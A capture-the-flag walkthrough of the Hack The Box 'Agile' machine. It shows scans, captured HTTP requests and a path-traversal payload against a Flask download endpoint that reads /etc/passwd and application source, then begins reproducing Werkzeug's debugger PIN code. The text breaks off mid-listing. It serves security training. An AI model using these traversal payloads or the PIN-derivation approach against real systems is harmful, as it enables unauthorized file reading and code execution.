# Agile HTB Walkthrough


![Agile](./agile.png)

## Introduction

After basic enumeration, we use LFI to read a Python Flask app.  We exploit the Werkzeug remote debugger by reading system information from the file system used to derive a PIN granting console access.  After executing arbitrary Python code in the browser REPL to get a reverse shell, we connect to a database with credentials from a connection string found earlier, which reveals user credentials granting us SSH access.  Next, we find a test suite that connects to headless Chrome using the Selenium web driver to run tests requiring authentication against a test instance of our vault app.  We learn how to connect to the Chrome remote debugger and dump cookies.  With access to the vault from a stolen cookie, we find a set of credentials that grants us SSH access to another user.  Finally, we exploit `sudoedit`, allowing us to edit arbitrary files -- we add another python reverse shell to a known cron job running as root, which grants us the root flag.

## Enumeration

Let's run a basic nmap scan:

```bash
$nmap -sC -sV -o nmap/initial 10.10.11.203
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 15:59 AEDT
Nmap scan report for 10.10.11.203
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.54 seconds
```

We add `10.10.11.203 superpass.htb` to /etc/hosts..  Navigating to the running web server, we get a landing page:

![](assets/2023-03-19-16-02-48-image.png)

Clicking the Get Started call-to-action or Login in the nav bar takes us to this login screen.  Note the Get Started action includes query param `next=%2Fvault` (not really useful later on, but I noted it here while in the moment!):

![](assets/2023-03-19-16-04-44-image.png)

Running a gobuster scan in the background, we get:

```bash
$gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://superpass.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://superpass.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/19 16:03:32 Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 302) [Size: 249] [--> /account/login?next=%2Fdownload]
/static               (Status: 301) [Size: 178] [--> http://superpass.htb/static/]   
/vault                (Status: 302) [Size: 243] [--> /account/login?next=%2Fvault]   

===============================================================
2023/03/19 16:03:44 Finished
===============================================================
```

Let's try the register option with some credentials `jsomeone`/ `foobar`:

![](assets/2023-03-19-16-09-04-image.png)

Which gives me an exception and stack trace -- unsure if this was intended, or a genuine error? (I later found out this is just a bug/problem, and not intended to be part of the process):

![](assets/2023-03-19-16-18-36-image.png)

A refresh shows me a vault where I can add and export passwords.  So it seems I can easily register and log in:

![](assets/2023-03-19-16-20-14-image.png)

When clicking *Add a password*, we see what looks like a password manager, generating a random password for us -- and we can enter a site and username, before clicking save:

![](assets/2023-03-19-16-23-30-image.png)

When saving the above, as captured by BurpSuite:

```
POST /vault/add_row HTTP/1.1
Host: superpass.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://superpass.htb/vault
HX-Request: true
HX-Current-URL: http://superpass.htb/vault
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: http://superpass.htb
DNT: 1
Connection: close
Cookie: session=.eJy9jk1qwzAQha8iZm2KJI9GGp-i-xLCSBrFBrcJlrMKuXsFvUNXj8f74XvBte3SV-2wfL3AnEPgW3uXm8IEn7tKV7Pfb2b7MefdSCkjNOe6dfMYnQ-4vKd_3l2mAX1oX2E5j6cOt1VYALlmx61pTjXGhOixVVtKSLFIFSGpDWeRHIkyBs3sQmCLwjIHKoTNBk7quQkl710pXplnDhibsiWuQVJUJ9Qo0eyrJLE4TmIKlmMZ-Ndn1-OPxjt4_wIcJ2t7.ZBaZAA.8XRrRgigTWhr28G4u9SW_oL8u4A; remember_token=21|375c7a4d26553e4e568b19ac19f945febe04f81248efe05bbcc6c522853c580393454491f9638fd8999ce58ac91e2919d49448ed7b9e3db167a61c9934a433ae
Pragma: no-cache
Cache-Control: no-cache

url=www.google.com&username=jsomeone&password=4c93f8a00620782c329f
```

We can also export our vault, as CSV, which is a `GET /vault/export` request, and following the 302 redirect in BurpSuite we get:

```
GET /download?fn=jsomeone_export_bea9db78a7.csv HTTP/1.1
Host: superpass.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJy9jk1qwzAQha8iZm2KJI9GGp-i-xLCSBrFBrcJlrMKuXsFvUNXj8f74XvBte3SV-2wfL3AnEPgW3uXm8IEn7tKV7Pfb2b7MefdSCkjNOe6dfMYnQ-4vKd_3l2mAX1oX2E5j6cOt1VYALlmx61pTjXGhOixVVtKSLFIFSGpDWeRHIkyBs3sQmCLwjIHKoTNBk7quQkl710pXplnDhibsiWuQVJUJ9Qo0eyrJLE4TmIKlmMZ-Ndn1-OPxjt4_wIcJ2t7.ZBaZAA.8XRrRgigTWhr28G4u9SW_oL8u4A; remember_token=21|375c7a4d26553e4e568b19ac19f945febe04f81248efe05bbcc6c522853c580393454491f9638fd8999ce58ac91e2919d49448ed7b9e3db167a61c9934a433ae
Upgrade-Insecure-Requests: 1
Referer: http://superpass.htb/vault/export
```

If we change the CSV filename to something bogus, we get:

```
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 19 Mar 2023 05:57:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 13639
Connection: close

<!doctype html>
<html lang=en>
  <head>
    <title>FileNotFoundError: [Errno 2] No such file or directory: '/tmp/jsomeone_export_doesnt_exist.csv'
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&cmd=resource&f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&cmd=resource&f=console.png">
    <script src="?__debugger__=yes&cmd=resource&f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "sSaLzEyA36ncL6OhOEdD";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>FileNotFoundError</h1>
<div class="detail">
  <p class="errormsg">FileNotFoundError: [Errno 2] No such file or directory: &#39;/tmp/jsomeone_export_doesnt_exist.csv&#39;
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-140570402696528">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">2528</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-140570402693056">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">2525</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: t.Optional[BaseException] = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-140570402699664">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">1822</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: t.Union[ft.ResponseReturnValue, HTTPException],</pre></div>
</div>

<li><div class="frame" id="frame-140570402699888">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">1820</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-140570402694960">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">1796</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: t.Dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -> Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-140570402698880">
  <h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask_login/utils.py"</cite>,
      line <em class="line">290</em>,
      in <code class="function">decorated_view</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>return current_app.login_manager.unauthorized()</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span># flask 1.x compatibility</pre>
<pre class="line before"><span class="ws">        </span># current_app.ensure_sync is only available in Flask >= 2.0</pre>
<pre class="line before"><span class="ws">        </span>if callable(getattr(current_app, &#34;ensure_sync&#34;, None)):</pre>
<pre class="line current"><span class="ws">            </span>return current_app.ensure_sync(func)(*args, **kwargs)</pre>
<pre class="line after"><span class="ws">        </span>return func(*args, **kwargs)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>return decorated_view</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-140570402697424">
  <h4>File <cite class="filename">"/app/app/superpass/views/vault_views.py"</cite>,
      line <em class="line">102</em>,
      in <code class="function">download</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span>@blueprint.get(&#39;/download&#39;)</pre>
<pre class="line before"><span class="ws"></span>@login_required</pre>
<pre class="line before"><span class="ws"></span>def download():</pre>
<pre class="line before"><span class="ws">    </span>r = flask.request</pre>
<pre class="line before"><span class="ws">    </span>fn = r.args.get(&#39;fn&#39;)</pre>
<pre class="line current"><span class="ws">    </span>with open(f&#39;/tmp/{fn}&#39;, &#39;rb&#39;) as f:</pre>
<pre class="line after"><span class="ws">        </span>data = f.read()</pre>
<pre class="line after"><span class="ws">    </span>resp = flask.make_response(data)</pre>
<pre class="line after"><span class="ws">    </span>resp.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=superpass_export.csv&#39;</pre>
<pre class="line after"><span class="ws">    </span>resp.mimetype = &#39;text/csv&#39;</pre>
<pre class="line after"><span class="ws">    </span>return resp</pre></div>
</div>
</ul>
  <blockquote>FileNotFoundError: [Errno 2] No such file or directory: &#39;/tmp/jsomeone_export_doesnt_exist.csv&#39;
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 2528, in wsgi_app
    response = self.handle_exception(e)
  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 2525, in wsgi_app
    response = self.full_dispatch_request()
  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 1822, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 1820, in full_dispatch_request
    rv = self.dispatch_request()
  File &#34;/app/venv/lib/python3.10/site-packages/flask/app.py&#34;, line 1796, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File &#34;/app/venv/lib/python3.10/site-packages/flask_login/utils.py&#34;, line 290, in decorated_view
    return current_app.ensure_sync(func)(*args, **kwargs)
  File &#34;/app/app/superpass/views/vault_views.py&#34;, line 102, in download
    with open(f&#39;/tmp/{fn}&#39;, &#39;rb&#39;) as f:
FileNotFoundError: [Errno 2] No such file or directory: &#39;/tmp/jsomeone_export_doesnt_exist.csv&#39;
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 2528, in wsgi_app
    response = self.handle_exception(e)
  File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 2525, in wsgi_app
    response = self.full_dispatch_request()
  File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 1822, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 1820, in full_dispatch_request
    rv = self.dispatch_request()
  File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 1796, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File "/app/venv/lib/python3.10/site-packages/flask_login/utils.py", line 290, in decorated_view
    return current_app.ensure_sync(func)(*args, **kwargs)
  File "/app/app/superpass/views/vault_views.py", line 102, in download
    with open(f'/tmp/{fn}', 'rb') as f:
FileNotFoundError: [Errno 2] No such file or directory: '/tmp/jsomeone_export_doesnt_exist.csv'


-->
```

Or, in the browser -- a little more readable:

![](assets/2023-03-19-16-58-30-image.png)

We see in the header tag, the following javascript:

```html
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "sSaLzEyA36ncL6OhOEdD";
    </script>
```

So we have *some* secret (JWT signing key?).  Oh, let's try LFI with a basic path traversal by modifying our CSV download GET HTTP request:

```
GET /download?fn=../../../etc/passwd HTTP/1.1
```

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 19 Mar 2023 06:00:28 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 1744
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```

So this actually works, and we can see the following 'real' users who have a valid login shell:

```bash
grep -vE "nologin|false" users.txt 

root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
corum:x:1000:1000:corum:/home/corum:/bin/bash
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/
```

So it looks like we're dealing with an Ubuntu machine running a Python Flask based web app on nginx/1.18.  The app is a basic password manager/vault that let's us download a CSV of our stored credentials.  If the file doesn't exist, we get a valuable 
stack trace containing a secret in a javascript `<script>` tag.

We can also do path traversal to give us local file inclusion.

The stack trace above refers to `/app/app/superpass/views/vault_view.py`.  We can retrieve this to see how the app works, by calling `GET /download?fn=../../../app/app/superpass/views/vault_views.py HTTP/1.1`:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 19 Mar 2023 06:05:20 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 2987
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

import flask
import subprocess
from flask_login import login_required, current_user
from superpass.infrastructure.view_modifiers import response
import superpass.services.password_service as password_service
from superpass.services.utility_service import get_random
from superpass.data.password import Password


blueprint = flask.Blueprint('vault', __name__, template_folder='templates')


@blueprint.route('/vault')
@response(template_file='vault/vault.html')
@login_required
def vault():
    passwords = password_service.get_passwords_for_user(current_user.id)
    print(f'{passwords=}')
    return {'passwords': passwords}


@blueprint.get('/vault/add_row')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def add_row():
    p = Password()
    p.password = get_random(20)
    return {"p": p}


@blueprint.get('/vault/edit_row/<id>')
@response(template_file='vault/partials/password_row_editable.html')
@login_required
def get_edit_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.get('/vault/row/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def get_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}


@blueprint.post('/vault/add_row')
@login_required
def add_row_post():
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        return ''

    p = password_service.add_password(site, username, password, current_user.id)
    return flask.render_template('vault/partials/password_row.html', p=p)


@blueprint.post('/vault/update/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def update(id):
    r = flask.request
    site = r.form.get('url', '').strip()
    username = r.form.get('username', '').strip()
    password = r.form.get('password', '').strip()

    if not (site or username or password):
        flask.abort(500)

    p = password_service.update_password(id, site, username, password, current_user.id)

    return {"p": p}


@blueprint.delete('/vault/delete/<id>')
@login_required
def delete(id):
    password_service.delete_password(id, current_user.id)
    return ''


@blueprint.get('/vault/export')
@login_required
def export():
    if current_user.has_passwords:        
        fn = password_service.generate_csv(current_user)
        return flask.redirect(f'/download?fn={fn}', 302)
    return "No passwords for user"


@blueprint.get('/download')
@login_required
def download():
    r = flask.request
    fn = r.args.get('fn')
    with open(f'/tmp/{fn}', 'rb') as f:
        data = f.read()
    resp = flask.make_response(data)
    resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'
    resp.mimetype = 'text/csv'
    return resp
```

I went down a rabbit hole, thinking the secret above was for an exposed JWT signing key.  When backtracking, and attempting to download an invalid vault CSV file, I found the page is using the werkzeug debugger - see [Debugging Applications &#8212; Werkzeug Documentation (2.2.x)](https://werkzeug.palletsprojects.com/en/2.2.x/debug/).  This provides a *middleware that renders nice trace-backs, optionally with an interactive debug console to execute code in any frame*.

There is a [HackTricks werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) page with details on how to get console RCE.

I tried clicking on the stack trace, and it asks for a PIN -- so we enter our secret:

![](assets/2023-03-19-18-47-13-image.png)

This gives an `incorrect pin` error. Yep, I was being lazy and assuming an easy bypass..

HackTricks mentions you can reverse engineer the algorithm used to derive the PIN by looking at e.g. `/python3.5/site-packages/werkzeug/debug/__init__.py`

From our stack trace, we work out the correct path for werkzeug, and try the following LFI to read `/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py`:

```
GET /download?fn=../../../app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py HTTP/1.1
Host: superpass.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJy9jk1qwzAQha8iZm2KJI9GGp-i-xLCSBrFBrcJlrMKuXsFvUNXj8f74XvBte3SV-2wfL3AnEPgW3uXm8IEn7tKV7Pfb2b7MefdSCkjNOe6dfMYnQ-4vKd_3l2mAX1oX2E5j6cOt1VYALlmx61pTjXGhOixVVtKSLFIFSGpDWeRHIkyBs3sQmCLwjIHKoTNBk7quQkl710pXplnDhibsiWuQVJUJ9Qo0eyrJLE4TmIKlmMZ-Ndn1-OPxjt4_wIcJ2t7.ZBaZAA.8XRrRgigTWhr28G4u9SW_oL8u4A;remember_token=21|375c7a4d26553e4e568b19ac19f945febe04f81248efe05bbcc6c522853c580393454491f9638fd8999ce58ac91e2919d49448ed7b9e3db167a61c9934a433ae
Upgrade-Insecure-Requests: 1
Referer: http://superpass.htb/vault/export
```

```python
import getpass
import hashlib
import json
import os
import pkgutil
import re
import sys
import time
import typing as t
import uuid
from contextlib import ExitStack
from contextlib import nullcontext
from io import BytesIO
from itertools import chain
from os.path import basename
from os.path import join
from zlib import adler32

from .._internal import _log
from ..exceptions import NotFound
from ..http import parse_cookie
from ..security import gen_salt
from ..utils import send_file
from ..wrappers.request import Request
from ..wrappers.response import Response
from .console import Console
from .tbtools import DebugFrameSummary
from .tbtools import DebugTraceback
from .tbtools import render_console_html

if t.TYPE_CHECKING:
    from _typeshed.wsgi import StartResponse
    from _typeshed.wsgi import WSGIApplication
    from _typeshed.wsgi import WSGIEnvironment

# A week
PIN_TIME = 60 * 60 * 24 * 7


def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]


_machine_id: t.Optional[t.Union[str, bytes]] = None


def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -> t.Optional[t.Union[str, bytes]]:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

        # On OS X, use ioreg to get the computer's serial number.
        try:
            # subprocess may not be available, e.g. Google App Engine
            # https://github.com/pallets/werkzeug/issues/925
            from subprocess import Popen, PIPE

            dump = Popen(
                ["ioreg", "-c", "IOPlatformExpertDevice", "-d", "2"], stdout=PIPE
            ).communicate()[0]
            match = re.search(b'"serial-number" = <([^>]+)', dump)

            if match is not None:
                return match.group(1)
        except (OSError, ImportError):
            pass

        # On Windows, use winreg to get the machine guid.
        if sys.platform == "win32":
            import winreg

            try:
                with winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Cryptography",
                    0,
                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,
                ) as rk:
                    guid: t.Union[str, bytes]
                    guid_type: int
                    guid, guid_type = winreg.QueryValueEx(rk, "MachineGuid")

                    if guid_type == winreg.REG_SZ:
                        return guid.encode("utf-8")

                    return guid
            except OSError:
                pass

        return None

    _machine_id = _generate()
    return _machine_id


class _ConsoleFrame:
    """Helper class so that we can reuse the frame console code for the
    standalone console.
    """

    def __init__(self, namespace: t.Dict[str, t.Any]):
        self.console = Console(namespace)
        self.id = 0

    def eval(self, code: str) -> t.Any:
        return self.console.eval(code)


def get_pin_and_cookie_name(
    app: "WSGIApplication",
) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

    # Pin was explicitly disabled
    if pin == "off":
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace("-", "").isdecimal():
        # If there are separators in the pin, return it directly
        if "-" in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
    username: t.Optional[str]

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
